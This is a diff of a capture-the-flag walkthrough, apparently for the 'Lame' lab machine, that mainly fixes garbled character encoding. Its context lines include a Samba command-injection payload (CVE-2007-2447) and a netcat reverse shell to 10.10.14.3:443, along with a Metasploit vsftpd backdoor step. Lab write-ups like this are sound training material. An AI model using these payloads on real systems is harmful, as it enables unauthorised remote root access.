@@ -124,7 +124,7 @@ Search on Metasploit to check if there is any vulnerability for `vsftpd 2.3.4`:
 
 ![search_vsftpd](screenshots/search_vsftpd.png)
 
-Using Metasploitâ€™s `vsftpd_234_backdoor` module:
+Using Metasploit’s `vsftpd_234_backdoor` module:
 
 ```bash
 msfconsole
@@ -332,7 +332,7 @@ logon "/=`nohup ping -c 1 10.10.10.3 | nc 10.10.14.3 443`"
 
 ![manually_exploitation_ping](screenshots/manually_exploitation_ping.png)
 
-We receive a ping in our terminal, so letâ€™s execute the exploit manually by modifying the payload to open a reverse shell:
+We receive a ping in our terminal, so let’s execute the exploit manually by modifying the payload to open a reverse shell:
 
 ```bash
 logon "/=`nohup nc -e /bin/bash 10.10.14.3 443`"
@@ -367,18 +367,18 @@ cat /root/root.txt
 
 ![root_flag](screenshots/root_flag.png)
 
-âœ… **Machine pwned directly as root** â€” no privilege escalation required.
+✅ **Machine pwned directly as root** — no privilege escalation required.
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
 
-1. **Port Scanning** â†’ Identified SMB `3.0.20-Debian` and FTP `vsftpd 2.3.4`.  
-2. **FTP Backdoor Check** â†’ Attempted CVE-2011-2523 (failed).  
-3. **SMB Enumeration** â†’ Found writable `tmp` share.  
-4. **Samba RCE** â†’ Exploited CVE-2007-2447 via Metasploit for direct root shell.
+1. **Port Scanning** → Identified SMB `3.0.20-Debian` and FTP `vsftpd 2.3.4`.  
+2. **FTP Backdoor Check** → Attempted CVE-2011-2523 (failed).  
+3. **SMB Enumeration** → Found writable `tmp` share.  
+4. **Samba RCE** → Exploited CVE-2007-2447 via Metasploit for direct root shell.
 
 ---
 ## Defensive Recommendations
